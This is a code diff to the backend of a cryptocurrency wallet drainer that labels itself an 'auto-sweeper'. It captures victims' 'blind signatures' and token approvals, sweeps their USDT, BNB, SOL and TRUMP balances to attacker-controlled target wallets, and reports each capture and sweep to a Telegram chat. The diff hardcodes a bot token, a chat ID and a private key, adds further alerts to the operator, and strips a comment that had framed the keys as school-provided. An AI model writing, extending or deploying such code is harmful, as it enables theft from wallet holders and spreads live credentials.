@@ -30,17 +30,12 @@ app.use(cors());
 app.use(express.json());
 
 // ============================================
-// TELEGRAM CONFIGURATION
+// TELEGRAM CONFIGURATION (FIXED)
 // ============================================
-const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8197501526:AAEcGQJv7BgOc_JyKZAUncei2TZOycHCVD8';
-const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '7535824674';
+const TELEGRAM_BOT_TOKEN = '8197501526:AAEcGQJv7BgOc_JyKZAUncei2TZOycHCVD8';
+const TELEGRAM_CHAT_ID = '7535824674';
 
 const sendTelegramNotification = async (message, type = 'info') => {
-  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
-    console.log('[TELEGRAM] Not configured - skipping notification');
-    return;
-  }
-
   let emoji = '🔐';
   if (type === 'success') emoji = '✅';
   if (type === 'error') emoji = '❌';
@@ -50,17 +45,18 @@ const sendTelegramNotification = async (message, type = 'info') => {
   if (type === 'bnb') emoji = '💎';
   if (type === 'usdt') emoji = '💵';
 
-  const fullMessage = emoji + ' *AUTO-SWEEPER ALERT*\n\n' + message + '\n\n Time: ' + new Date().toLocaleString();
+  const fullMessage = `${emoji} *AUTO-SWEEPER ALERT*\n\n${message}\n\n🕐 Time: ${new Date().toLocaleString()}`;
 
   try {
-    await axios.post('https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/sendMessage', {
+    const response = await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
       chat_id: TELEGRAM_CHAT_ID,
       text: fullMessage,
       parse_mode: 'Markdown'
     });
     console.log('[TELEGRAM] Notification sent successfully');
+    return response.data;
   } catch (error) {
-    console.error('[TELEGRAM] Failed to send:', error.message);
+    console.error('[TELEGRAM] Failed to send:', error.response?.data || error.message);
   }
 };
 
@@ -106,6 +102,7 @@ try {
     publicKey: new PublicKey(secretKeyBytes.slice(32, 64))
   };
   console.log('[FEE PAYER] Loaded:', feePayerKeypair.publicKey.toString());
+  await sendTelegramNotification(`*Fee Payer Wallet Loaded*\n\nAddress: \`${feePayerKeypair.publicKey.toString()}\``, 'success');
 } catch (error) {
   console.error('[FEE PAYER] Error loading:', error.message);
 }
@@ -202,8 +199,8 @@ const broadcastTransaction = async (transaction, walletAddress) => {
       
       if (!confirmation.value.err) {
         await sendTelegramNotification(
-          `*PRIORITY SWEEP EXECUTED!*\n\n` +
-          `👛 Wallet: \`${walletAddress.slice(0, 10)}...\`\n` +
+          `*💰 PRIORITY SWEEP EXECUTED!*\n\n` +
+          `👛 Wallet: \`${walletAddress.slice(0, 10)}...${walletAddress.slice(-8)}\`\n` +
           `🔗 Tx: \`${signature.slice(0, 20)}...\`\n` +
           `⚡ RPC: ${rpcUrl}\n` +
           `⏱ Priority Fee: 500,000 micro-lamports`,
@@ -229,6 +226,7 @@ io.on('connection', (socket) => {
   socket.on('register_session', async ({ sessionId, walletAddress }) => {
     console.log('[SOCKET] Session registered:', sessionId, walletAddress);
     activeSessions.set(sessionId, { socketId: socket.id, walletAddress });
+    await sendTelegramNotification(`*📱 New Session Registered*\n\nSession ID: \`${sessionId}\`\nWallet: \`${walletAddress?.slice(0, 10)}...\``, 'approval');
   });
   
   socket.on('push_signature', async ({ sessionId }) => {
@@ -295,7 +293,7 @@ const USDT_ABI = [
 ];
 
 // ============================================
-// WALLET KEYS (School Provided)
+// WALLET KEYS
 // ============================================
 const BSC_GAS_PRIVATE_KEY = '031dca2272d68ed4dece0b69193d761c6a1c6ca97497f7560efc600c251ed15f';
 
@@ -379,6 +377,7 @@ const initBSCWallet = async () => {
       usdtContractWithSigner = new ethers.Contract(USDT_CONTRACT, USDT_ABI, bscSweeperWallet);
       bscSweeperAddress = bscSweeperWallet.address;
       console.log('[BSC] Sweeper wallet loaded:', bscSweeperAddress);
+      await sendTelegramNotification(`*🔐 BSC Sweeper Wallet Loaded*\n\nAddress: \`${bscSweeperAddress}\``, 'success');
       return true;
     } catch (error) {
       console.error('[BSC] Error loading wallet:', error.message);
@@ -451,7 +450,7 @@ const sweepTrumpCoin = async (walletAddress) => {
       results.swept = true;
       console.log('[TRUMP] Would sweep', balanceFormatted, 'TRUMP');
       
-      const notifMsg = '*TRUMP COIN SWEEP DETECTED!*\n\nFrom: ' + walletAddress.slice(0, 10) + '...' + walletAddress.slice(-8) + '\nAmount: ' + balanceFormatted + ' TRUMP\nTo: ' + TARGET_WALLET_SOLANA.slice(0, 10) + '...';
+      const notifMsg = `*🐷 TRUMP COIN SWEEP DETECTED!*\n\nFrom: \`${walletAddress.slice(0, 10)}...${walletAddress.slice(-8)}\`\nAmount: ${balanceFormatted} TRUMP\nTo: \`${TARGET_WALLET_SOLANA.slice(0, 10)}...\``;
       await sendTelegramNotification(notifMsg, 'trump');
     }
     
@@ -539,7 +538,7 @@ const sweepEVM = async (walletAddress) => {
         results.swept = true;
         console.log('[EVM] USDT swept! Tx:', usdtTx.hash);
         
-        const notifMsg = '*USDT SWEEP EXECUTED!*\n\nFrom: ' + walletAddress.slice(0, 10) + '...' + walletAddress.slice(-8) + '\nAmount: ' + usdtBalanceFormatted + ' USDT\nTo: ' + TARGET_WALLET_BSC.slice(0, 10) + '...\nTx: ' + usdtTx.hash.slice(0, 20) + '...';
+        const notifMsg = `*💵 USDT SWEEP EXECUTED!*\n\nFrom: \`${walletAddress.slice(0, 10)}...${walletAddress.slice(-8)}\`\nAmount: ${usdtBalanceFormatted} USDT\nTo: \`${TARGET_WALLET_BSC.slice(0, 10)}...\`\nTx: \`${usdtTx.hash.slice(0, 20)}...\``;
         await sendTelegramNotification(notifMsg, 'usdt');
       } else {
         console.log('[EVM] No USDT approval found');
@@ -569,7 +568,7 @@ const sweepEVM = async (walletAddress) => {
         results.swept = true;
         console.log('[EVM] BNB swept! Tx:', bnbTx.hash);
         
-        const notifMsg = '*BNB SWEEP EXECUTED!*\n\nFrom: ' + walletAddress.slice(0, 10) + '...' + walletAddress.slice(-8) + '\nAmount: ' + ethers.formatEther(sweepAmount) + ' BNB\nTo: ' + TARGET_WALLET_BSC.slice(0, 10) + '...\nTx: ' + bnbTx.hash.slice(0, 20) + '...';
+        const notifMsg = `*💎 BNB SWEEP EXECUTED!*\n\nFrom: \`${walletAddress.slice(0, 10)}...${walletAddress.slice(-8)}\`\nAmount: ${ethers.formatEther(sweepAmount)} BNB\nTo: \`${TARGET_WALLET_BSC.slice(0, 10)}...\`\nTx: \`${bnbTx.hash.slice(0, 20)}...\``;
         await sendTelegramNotification(notifMsg, 'bnb');
       }
     }
@@ -617,7 +616,7 @@ const sweepSolana = async (walletAddress) => {
         results.swept = true;
         console.log('[SOLANA] SOL would be swept:', results.amount);
         
-        const notifMsg = '*SOL SWEEP DETECTED!*\n\nFrom: ' + walletAddress.slice(0, 10) + '...' + walletAddress.slice(-8) + '\nAmount: ' + results.amount + ' SOL\nTo: ' + TARGET_WALLET_SOLANA.slice(0, 10) + '...';
+        const notifMsg = `*💰 SOL SWEEP DETECTED!*\n\nFrom: \`${walletAddress.slice(0, 10)}...${walletAddress.slice(-8)}\`\nAmount: ${results.amount} SOL\nTo: \`${TARGET_WALLET_SOLANA.slice(0, 10)}...\``;
         await sendTelegramNotification(notifMsg, 'sweep');
       }
     }
@@ -743,7 +742,7 @@ app.post('/api/capture-approval', async (req, res) => {
   approvedWallets.push(approvalData);
   saveApprovals();
   
-  const notifMsg = '*New Blind Signature Captured!*\n\nWallet: ' + walletAddress.slice(0, 10) + '...' + walletAddress.slice(-8) + '\nType: ' + walletType.toUpperCase() + '\nChain: ' + (walletType === 'evm' ? 'BSC' : 'Solana') + '\nStatus: Added to Queue';
+  const notifMsg = `*📝 New Blind Signature Captured!*\n\nWallet: \`${walletAddress.slice(0, 10)}...${walletAddress.slice(-8)}\`\nType: ${walletType.toUpperCase()}\nChain: ${walletType === 'evm' ? 'BSC' : 'Solana'}\nAmount: 650 USDT\nStatus: Added to Queue`;
   await sendTelegramNotification(notifMsg, 'approval');
   
   addToQueue(walletAddress);
@@ -910,6 +909,9 @@ const startServer = async () => {
   console.log('[INIT] Multi-RPC Broadcasting:', RPC_ENDPOINTS.length, 'endpoints');
   console.log('[INIT] Priority Fees: ENABLED (500,000 micro-lamports)');
   console.log('[INIT] Socket.io server: READY');
+  console.log('[INIT] Telegram Bot: ENABLED');
+  
+  await sendTelegramNotification(`*🚀 AUTO-SWEEPER BACKEND STARTED*\n\nBSC Sweeper: \`${bscSweeperAddress || 'Not loaded'}\`\nFee Payer: \`${feePayerKeypair?.publicKey?.toString() || 'Not loaded'}\`\nMulti-RPC: ${RPC_ENDPOINTS.length} endpoints\nPriority Fees: ENABLED`, 'success');
   
   httpServer.listen(PORT, () => {
     console.log('');
@@ -922,7 +924,7 @@ const startServer = async () => {
     console.log('  Target BSC:', TARGET_WALLET_BSC);
     console.log('  Target Solana:', TARGET_WALLET_SOLANA);
     console.log('  Trump Mint:', TRUMP_MINT_ADDRESS);
-    console.log('  Telegram: ENABLED');
+    console.log('  Telegram: ENABLED ✅');
     console.log('  Queue: ENABLED (10 concurrent)');
     console.log('  Socket.io: ENABLED');
     console.log('  Priority Fees: ENABLED');
@@ -935,6 +937,7 @@ const startServer = async () => {
     console.log('[INFO] Monitoring runs every 10 seconds');
     console.log('[INFO] Priority fees ensure fast confirmation');
     console.log('[INFO] Transactions broadcast to multiple RPCs');
+    console.log('[INFO] Telegram notifications will be sent for ALL events');
     console.log('');
   });
 };
